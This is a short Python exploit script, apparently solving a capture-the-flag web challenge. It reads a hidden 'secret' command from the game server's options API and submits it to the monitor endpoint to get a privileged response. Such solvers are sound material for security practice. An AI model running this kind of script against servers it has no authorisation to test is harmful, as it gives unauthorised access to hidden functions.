#!/usr/bin/env python3
import sys
import requests


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}"

    # The options endpoint lists a "secret" key that the game client accepts
    # as a valid command. The value is sent to /api/monitor as-is.
    options = requests.get(f"{base_url}/api/options", timeout=5).json()
    secret_command = options["allPossibleCommands"]["secret"][0]

    print(f"[*] Sending secret command to {base_url}/api/monitor...")
    try:
        response = requests.post(
            f"{base_url}/api/monitor",
            json={"command": secret_command},
            timeout=5,
        )
        print(f"\n[+] Status Code: {response.status_code}")
        print(f"[+] Response Output:\n{response.json()['message']}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
